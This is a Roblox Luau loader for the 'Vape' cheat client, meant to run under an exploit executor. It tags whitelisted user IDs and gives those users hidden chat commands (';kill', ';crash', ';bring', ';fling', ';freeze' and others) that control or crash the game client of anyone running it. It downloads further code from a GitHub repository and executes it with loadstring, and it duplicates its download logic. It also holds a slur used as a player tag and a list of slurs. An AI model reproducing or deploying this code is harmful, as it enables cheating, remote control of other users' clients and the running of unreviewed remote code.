local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LOCAL_PLAYER = Players.LocalPlayer

local whitelist = {
	Owner = {
		4279175156, 4202838123, 4307561815, 4380912728, 8334967500, 4240568437, 4262245137, 8336776571, 8309882908, 8335222717,
		4429753384, 8038312847, 3662747580, 4371940736, 116968806, 8337993466, 8336675908, 8293712327, 8244741218, 8313657982
	},
	Private = {
		5413983848, 4191327145, 1848051618, 1965898454, 1666325842, 1513390800, 8338110211,
		5546161719, 1983015440, 3204169739, 1880511134, 8336731586, 314732068, 3932037947, 8305374142,
		570843764, 4285992482, 8319446554, 8253283385, 8244658784, 8244710849, 8336505332, 8293567118
	},
	Slow = {1562251033}
}

local function isInList(u, list)
	for _, id in ipairs(list) do
		if u == id then return true end
	end
	return false
end

local function isWhitelisted(u)
	return isInList(u, whitelist.Owner) or isInList(u, whitelist.Private)
end

local function applyTag(plr, txt, col)
	local function render()
		local head = plr.Character and plr.Character:FindFirstChild("Head")
		if not head or head:FindFirstChild("VapeTag") then return end
		local b = Instance.new("BillboardGui")
		b.Name = "VapeTag"
		b.Size = UDim2.new(0, 100, 0, 20)
		b.StudsOffset = Vector3.new(0, 3, 0)
		b.AlwaysOnTop = true
		b.Adornee = head
		b.Parent = head
		local l = Instance.new("TextLabel")
		l.Size = UDim2.fromScale(1, 1)
		l.BackgroundTransparency = 1
		l.Text = txt
		l.TextColor3 = col
		l.TextStrokeTransparency = 0.3
		l.TextStrokeColor3 = Color3.new(0, 0, 0)
		l.Font = Enum.Font.GothamBold
		l.TextScaled = true
		l.Parent = b
	end
	if plr == LOCAL_PLAYER then return end
	if plr.Character then render() else plr.CharacterAdded:Once(function() task.wait(0.5) render() end) end
end

local function tag(plr)
	local id = plr.UserId
	if isInList(id, whitelist.Owner) then
		applyTag(plr, "Vape OWNER", Color3.fromRGB(210, 4, 45))
	elseif isInList(id, whitelist.Private) then
		applyTag(plr, "Vape Private", Color3.fromRGB(170, 0, 255))
	elseif isInList(id, whitelist.Slow) then
		applyTag(plr, "Retard", Color3.fromRGB(70, 130, 255))
	end
end

for _, p in ipairs(Players:GetPlayers()) do tag(p) end
Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)

local function getHRP()
	return LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart")
end

local function exec(cmd, senderId)
	cmd = string.lower(cmd)
	local undo = false
	if cmd:sub(1, 2) == ";u" and cmd:sub(1, 4) ~= ";unk" then
		cmd = ";" .. cmd:sub(4)
		undo = true
	end

	local sender = Players:GetPlayerByUserId(senderId)
	if not sender or not sender.Character or not sender.Character:FindFirstChild("HumanoidRootPart") then return end

	if cmd == ";kill" and not undo then
		local c = LOCAL_PLAYER.Character
		if c then for _, v in ipairs(c:GetDescendants()) do if v:IsA("BasePart") then v:BreakJoints() end end end

	elseif cmd == ";crash" and not undo then
		while true do end

	elseif cmd == ";bring" then
		if not undo and LOCAL_PLAYER ~= sender and getHRP() then
			getHRP().CFrame = sender.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
		end

	elseif cmd == ";fling" and not undo then
		local root, target = getHRP(), sender.Character.HumanoidRootPart
		if root then
			local bv = Instance.new("BodyVelocity")
			bv.Velocity = (target.Position - root.Position).Unit * 200
			bv.MaxForce = Vector3.new(1, 1, 1) * 1e6
			bv.P = 9e4
			bv.Parent = root
			game.Debris:AddItem(bv, 0.5)
		end

	elseif cmd == ";jump" then
		local h = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChildOfClass("Humanoid")
		if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end

	elseif cmd == ";sit" then
		local h = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChildOfClass("Humanoid")
		if h then h.Sit = not undo end

	elseif cmd == ";freeze" then
		local hrp = getHRP()
		if hrp then
			if undo then for _, v in ipairs(hrp:GetChildren()) do if v:IsA("BodyVelocity") and v.Name == "Frozen" then v:Destroy() end end
			else
				local bv = Instance.new("BodyVelocity")
				bv.Name = "Frozen"
				bv.Velocity = Vector3.new(0, 0, 0)
				bv.MaxForce = Vector3.new(1, 1, 1) * 1e9
				bv.P = 1e5
				bv.Parent = hrp
			end
		end

	elseif cmd == ";spin" then
		local hrp = getHRP()
		if hrp then
			if undo then
				for _, v in ipairs(hrp:GetChildren()) do if v:IsA("BodyAngularVelocity") and v.Name == "SpinForce" then v:Destroy() end end
			else
				local ang = Instance.new("BodyAngularVelocity")
				ang.AngularVelocity = Vector3.new(0, 10, 0)
				ang.MaxTorque = Vector3.new(0, math.huge, 0)
				ang.P = 10000
				ang.Name = "SpinForce"
				ang.Parent = hrp
			end
		end

	elseif cmd == ";invisible" then
		for _, p in ipairs(LOCAL_PLAYER.Character:GetDescendants()) do
			if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
				p.Transparency = undo and 0 or 1
			end
		end

	elseif cmd == ";nocollide" then
		for _, p in ipairs(LOCAL_PLAYER.Character:GetDescendants()) do
			if p:IsA("BasePart") then
				p.CanCollide = undo
			end
		end

	elseif cmd == ";anchor" then
		for _, p in ipairs(LOCAL_PLAYER.Character:GetDescendants()) do
			if p:IsA("BasePart") then
				p.Anchored = not undo
			end
		end
	end
end

local function randomBarcode(length)
	local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	local banned = {
		-- Things so like u dotn get banned (Microwave pls add more)
		"nig", "ni", "neg", "niga", "nigg", "kike", "chink", "coon", "gook", "spic", "wetb", "jew", "naz",
		"sex", "fuc", "fuq", "fuk", "cum", "cok", "cock", "dick", "dck", "dik", "vag", "vgn", "pns", "peni", "tit", "tits", "boob", "slut", "hoe", "whore", "nude", "nuds", "hump", "clit", "lick", "bang", "fap",
		"gay", "fag", "lez", "dyk", "dyke", "tranny", "trans",
		"g4y", "s3x", "f4g", "s3cks", "p0rn", "p@rn", "b1tch", "n1gga", "d1ck", "cvm", "n1g", "nibba",
		"shit", "crap", "ass", "bich", "bitch", "hell", "damn", "piss", "suck", "suk", "bast",
		"rbx", "robux", "free", "hack", "exploit", "admin", "mod", "yt", "discord", "dc", "dotcom", "givea", "link",
	}

	local function containsBanned(str)
		local lower = str:lower()
		for _, word in ipairs(banned) do
			if lower:find(word, 1, true) then
				return true
			end
		end
		return false
	end

	local barcode
	repeat
		barcode = ""
		for i = 1, length do
			local rand = math.random(1, #chars)
			barcode = barcode .. chars:sub(rand, rand)
		end
	until not containsBanned(barcode)
	
	return barcode
end

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/SOILXP/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then error(res) end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/SOILXP/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/SOILXP/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/SOILXP/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

return loadstring(downloadFile('newvape/main.lua'))()
